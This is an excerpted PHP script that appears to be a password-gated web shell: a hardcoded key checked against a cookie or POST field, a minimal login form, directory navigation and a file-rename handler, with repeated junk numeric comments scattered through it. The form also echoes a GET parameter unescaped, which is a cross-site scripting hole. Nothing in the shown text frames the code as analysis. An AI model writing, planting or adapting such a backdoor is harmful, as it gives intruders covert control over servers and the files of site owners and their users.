...
$auth_key = "0928418c04d2917717fc292ac244c6b9";
...
$pass = false;
if (isset($_COOKIE['pw_name_76126'])) {
    if(($_COOKIE['pw_name_76126']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_76126'])) {
        if(($_POST['pw_name_76126']) == $auth_key) {
            setcookie("pw_name_76126", $_POST['pw_name_76126']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_76126' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1737987030746462 1737987030972489 1737987030379696 1737987030762759
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1737987030746462 1737987030972489 1737987030379696 1737987030762759
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1737987030746462 1737987030972489 1737987030379696 1737987030762759
            $name = PATH . "/" . $_GET['r'];
